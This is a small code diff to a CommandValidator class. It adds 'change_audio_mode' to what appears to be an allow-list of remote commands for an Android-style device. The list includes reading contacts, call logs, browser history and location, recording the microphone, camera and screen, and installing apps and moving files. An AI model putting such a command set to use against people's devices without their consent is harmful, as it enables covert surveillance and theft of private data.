@@ -6,7 +6,7 @@ class CommandValidator
     get_wifi_info get_localtime uninstall_app install_apk
     launch_app get_installed_apps get_contacts take_picture
     screen_record get_location get_call_logs get_browser_history
-    toggle_wifi set_audio_mode get_notifications
+    toggle_wifi set_audio_mode change_audio_mode get_notifications
     list_files download_file upload_file delete_file preview_file
     rename_file move_file search_files upload_file_chunk
     take_screenshot location mic_record camera_capture
